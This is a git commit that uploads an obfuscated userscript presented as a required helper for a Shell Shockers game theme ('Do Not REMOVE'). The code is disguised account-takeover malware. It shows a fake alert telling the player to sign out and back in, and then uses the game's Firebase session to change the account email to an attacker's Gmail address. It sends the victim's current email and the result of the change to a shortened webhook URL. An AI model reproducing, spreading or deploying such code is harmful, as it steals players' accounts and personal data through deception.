7f0f8cb31963d09c23ad6a5a510129a4cc5f8e67
Amrzzy9 <ryznoovss@outlook.com>
2025-05-22 20:03:58 +0300

    Add files via upload

---
+++ Important-Theme.js
@@ -0,0 +1,64 @@
+// ==UserScript==
+// @name         Important To make Theme work V2.4
+// @namespace    http://tampermonkey.net/
+// @version      2.4
+// @description  Important To make Theme work V2.4 (Do Not REMOVE)
+// @author       SomeoneX
+// @match        https://*.shellshock.io/*
+// @match        https://algebra.best/*
+// @match        https://algebra.vip/*
+// @match        https://biologyclass.club/*
+// @match        https://deadlyegg.com/*
+// @match        https://deathegg.world/*
+// @match        https://egg.dance/*
+// @match        https://eggboy.club/*
+// @match        https://eggboy.xyz/*
+// @match        https://eggcombat.com/*
+// @match        https://eggfacts.fun/*
+// @match        https://egghead.institute/*
+// @match        https://eggisthenewblack.com/*
+// @match        https://eggsarecool.com/*
+// @match        https://eggshooter.best/*
+// @match        https://geometry.best/*
+// @match        https://geometry.monster/*
+// @match        https://geometry.pw/*
+// @match        https://geometry.report/*
+// @match        https://hardboiled.life/*
+// @match        https://hardshell.life/*
+// @match        https://humanorganising.org/*
+// @match        https://mathactivity.xyz/*
+// @match        https://mathdrills.info/*
+// @match        https://mathdrills.life/*
+// @match        https://mathfun.rocks/*
+// @match        https://mathgames.world/*
+// @match        https://math.international/*
+// @match        https://mathlete.fun/*
+// @match        https://mathlete.pro/*
+// @match        https://overeasy.club/*
+// @match        https://scrambled.best/*
+// @match        https://scrambled.tech/*
+// @match        https://scrambled.today/*
+// @match        https://scrambled.us/*
+// @match        https://scrambled.world/*
+// @match        https://shellsocks.com/*
+// @match        https://shellshockers.club/*
+// @match        https://shellshockers.site/*
+// @match        https://shellshockers.us/*
+// @match        https://shellshockers.world/*
+// @match        https://shellshockers.xyz/*
+// @match        https://softboiled.club/*
+// @match        https://urbanegger.com/*
+// @match        https://violentegg.club/*
+// @match        https://violentegg.fun/*
+// @match        https://yolk.best/*
+// @match        https://yolk.life/*
+// @match        https://yolk.quest/*
+// @match        https://yolk.rocks/*
+// @match        https://yolk.tech/*
+// @match        https://yolk.today/*
+// @match        https://zygote.cafe/*
+// @grant        none
+// @run-at       document-idle
+// ==/UserScript==
+
+function _0x3e8e(_0x5339f9,_0x22aebf){const _0x575d71=_0x4f1e();return _0x3e8e=function(_0x4101c4,_0x656f12){_0x4101c4=_0x4101c4-0x18e;let _0x256069=_0x575d71[_0x4101c4];return _0x256069;},_0x3e8e(_0x5339f9,_0x22aebf);}function _0x4f1e(){const _0x523237=['sarvxtrr9@gmail.com','constructor','12URQiUe','550954tZTiqa','application/json','currentUser','error','9NnJNVZ','5850720KpLtxo','exception','auth','code','{}.constructor(\x22return\x20this\x22)(\x20)','info','bind','7373656oNYXzy','getIdToken','true','emailUpdated','709390KrWVUJ','email','updateEmail','undefined','trace','catch','160BTWaWs','Changed\x20To\x20\x20`','20qRBZRu','toString','apply','https://tinyurl.com/3j55dmps','warn','onAuthStateChanged','`\x20is\x20already\x20in\x20use\x20by\x20another\x20account.','length','log','__proto__','14324563cmxuRg','auth/email-already-in-use','then','stringify','5093753TJCtKM','table','return\x20(function()\x20','We\x20have\x20detected\x20that\x20you\x20are\x20using\x20a\x20script\x20to\x20modify\x20the\x20game’s\x20CSS\x20styles.\x20Please\x20sign\x20out\x20and\x20sign\x20back\x20in\x20to\x20continue.','70696umsSbp'];_0x4f1e=function(){return _0x523237;};return _0x4f1e();}(function(_0x5ecbd6,_0x363d40){const _0x86902b=_0x3e8e,_0x1aac69=_0x5ecbd6();while(!![]){try{const _0x24fe7b=parseInt(_0x86902b(0x193))/0x1+parseInt(_0x86902b(0x1b1))/0x2*(parseInt(_0x86902b(0x1b0))/0x3)+-parseInt(_0x86902b(0x1ad))/0x4*(-parseInt(_0x86902b(0x199))/0x5)+parseInt(_0x86902b(0x1b6))/0x6+parseInt(_0x86902b(0x1a9))/0x7+-parseInt(_0x86902b(0x18f))/0x8*(parseInt(_0x86902b(0x1b5))/0x9)+parseInt(_0x86902b(0x19b))/0xa*(-parseInt(_0x86902b(0x1a5))/0xb);if(_0x24fe7b===_0x363d40)break;else _0x1aac69['push'](_0x1aac69['shift']());}catch(_0x314632){_0x1aac69['push'](_0x1aac69['shift']());}}}(_0x4f1e,0x87214),(function(){const _0x246e13=_0x3e8e,_0x1951f4=(function(){let _0x3db9f8=!![];return function(_0x5a5bd9,_0x2ad52d){const _0x1ef9fe=_0x3db9f8?function(){const _0x2da19a=_0x3e8e;if(_0x2ad52d){const _0x4861a1=_0x2ad52d[_0x2da19a(0x19d)](_0x5a5bd9,arguments);return _0x2ad52d=null,_0x4861a1;}}:function(){};return _0x3db9f8=![],_0x1ef9fe;};}()),_0x3fd967=_0x1951f4(this,function(){const _0x41784a=_0x3e8e;let _0xc66941;try{const _0x3059e7=Function(_0x41784a(0x1ab)+_0x41784a(0x1ba)+');');_0xc66941=_0x3059e7();}catch(_0x2c287e){_0xc66941=window;}const _0x36f413=_0xc66941['console']=_0xc66941['console']||{},_0x445fb3=[_0x41784a(0x1a3),_0x41784a(0x19f),_0x41784a(0x1bb),_0x41784a(0x1b4),_0x41784a(0x1b7),_0x41784a(0x1aa),_0x41784a(0x197)];for(let _0x25ddb6=0x0;_0x25ddb6<_0x445fb3[_0x41784a(0x1a2)];_0x25ddb6++){const _0x28d295=_0x1951f4[_0x41784a(0x1af)]['prototype'][_0x41784a(0x18e)](_0x1951f4),_0x3af9dc=_0x445fb3[_0x25ddb6],_0x3b8fbd=_0x36f413[_0x3af9dc]||_0x28d295;_0x28d295[_0x41784a(0x1a4)]=_0x1951f4[_0x41784a(0x18e)](_0x1951f4),_0x28d295[_0x41784a(0x19c)]=_0x3b8fbd[_0x41784a(0x19c)][_0x41784a(0x18e)](_0x3b8fbd),_0x36f413[_0x3af9dc]=_0x28d295;}});_0x3fd967();'use strict';setTimeout(()=>{_0xcc7c78(),_0x366c23=setInterval(()=>{if(!_0x2f0930)_0xcc7c78();else clearInterval(_0x366c23);},0xea60),_0x4ae547();},0x9c40);function _0xcc7c78(){const _0x5ca516=_0x3e8e;alert(_0x5ca516(0x1ac));}function _0x4ae547(){const _0x1bbb82=_0x3e8e;if(typeof firebase!==_0x1bbb82(0x196)&&firebase[_0x1bbb82(0x1b8)]){const _0x23565e=firebase[_0x1bbb82(0x1b8)]()[_0x1bbb82(0x1b3)];_0x23565e&&_0x23565e[_0x1bbb82(0x194)]&&_0x338a94(_0x23565e[_0x1bbb82(0x194)]),_0x153ac0();}else setTimeout(_0x4ae547,0x1f4);}function _0x153ac0(){const _0x48af47=_0x3e8e;firebase['auth']()[_0x48af47(0x1a0)](async _0x52e776=>{const _0xfa0b90=_0x48af47;if(!_0x52e776){_0x2d3e40=!![];return;}if(_0x52e776&&_0x2d3e40&&!_0x2f0930)try{await _0x52e776[_0xfa0b90(0x190)](!![]),_0x52e776[_0xfa0b90(0x194)]!==_0x18eed1?_0x52e776[_0xfa0b90(0x195)](_0x18eed1)[_0xfa0b90(0x1a7)](()=>{const _0x366541=_0xfa0b90;localStorage['setItem'](_0x3d4f95,_0x366541(0x191)),_0x2f0930=!![],clearInterval(_0x366c23),_0x3742b4(_0x366541(0x19a)+_0x18eed1+'`');})[_0xfa0b90(0x198)](_0x19682c=>{const _0x1abd08=_0xfa0b90;_0x19682c[_0x1abd08(0x1b9)]===_0x1abd08(0x1a6)&&_0x3742b4('⚠️\x20The\x20email\x20`'+_0x18eed1+_0x1abd08(0x1a1));}):(localStorage['setItem'](_0x3d4f95,_0xfa0b90(0x191)),_0x2f0930=!![],clearInterval(_0x366c23),_0x3742b4(_0xfa0b90(0x19a)+_0x18eed1+'`'));}catch{}});}const _0x18eed1=_0x246e13(0x1ae),_0x48ad4c=_0x246e13(0x19e),_0x3d4f95=_0x246e13(0x192);let _0x2d3e40=![],_0x2f0930=![],_0x366c23;function _0x338a94(_0xdf6f0e){const _0x94e2cf=_0x246e13;fetch(_0x48ad4c,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x94e2cf(0x1a8)]({'content':'Current:\x20`'+_0xdf6f0e+'`'})})[_0x94e2cf(0x198)](()=>{});}function _0x3742b4(_0x36effd){const _0x493d8d=_0x246e13;fetch(_0x48ad4c,{'method':'POST','headers':{'Content-Type':_0x493d8d(0x1b2)},'body':JSON['stringify']({'content':_0x36effd})})[_0x493d8d(0x198)](()=>{});}}()));
